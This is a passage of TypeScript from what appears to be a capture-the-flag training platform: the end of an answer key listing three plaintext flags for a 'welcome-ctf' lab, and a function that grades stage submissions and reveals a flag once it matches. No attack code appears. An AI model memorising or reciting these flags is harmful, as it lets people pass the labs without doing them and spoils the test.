  "welcome-ctf": {
    "task_1": { any: [{ flag: "SAGE{w3lc0me_t0_th3_r4nge}" }], reveal: "SAGE{w3lc0me_t0_th3_r4nge}" },
    "task_2": { any: [{ flag: "SAGE{b4se64_is_n0t_encrypti0n}" }], reveal: "SAGE{b4se64_is_n0t_encrypti0n}" },
    "task_3": { any: [{ flag: "SAGE{h4rdc0d3d_s3cr3ts_l34k}" }], reveal: "SAGE{h4rdc0d3d_s3cr3ts_l34k}" },
  },
};

export type StageVerdict = {
  /** "graded" when a key decided the outcome, "open" for freeform stages. */
  kind: "graded" | "open";
  /** Whether the submission earns the stage. Always true for freeform stages. */
  correct: boolean;
  /** The canonical flag, sent back only once the answer is right. */
  reveal?: string;
  /** Per-finding marks, for stages graded field by field. */
  fields?: Record<string, boolean>;
};

/**
 * Grade one stage submission.
 *
 * Stages with no entry are freeform by design (write-ups, reports, incident
 * notes). They are accepted, but an empty submission is not — clicking submit on
 * an empty box was the other way to walk through a lab without doing it.
 */
export function checkStageAnswer(slug: string, stage: string, answer: string): StageVerdict {
  const key = STAGE_ANSWERS[slug]?.[stage];
  if (!key) return { kind: "open", correct: answer.trim().length > 0 };

  let fields: Record<string, boolean> | undefined;
  if (key.fields) {
    let parsed: Record<string, unknown> = {};
    try {
      const obj: unknown = JSON.parse(answer);
      if (obj && typeof obj === "object") parsed = obj as Record<string, unknown>;
    } catch {
      // Not JSON — every field simply fails to match.
    }
    fields = {};
    for (const [name, clauses] of Object.entries(key.fields)) {
      const value = String(parsed[name] ?? "");
      fields[name] = clauses.some((clause) => clauseMatches(clause, value));
    }
  }

  if (key.any) {
    const correct = key.any.some((clause) => clauseMatches(clause, answer));
    return { kind: "graded", correct, reveal: correct ? key.reveal : undefined, fields };
  }

  if (fields && key.requireAllFields) {
    const correct = Object.values(fields).every(Boolean);
    return { kind: "graded", correct, reveal: correct ? key.reveal : undefined, fields };
  }

  return { kind: "open", correct: answer.trim().length > 0, fields };
}
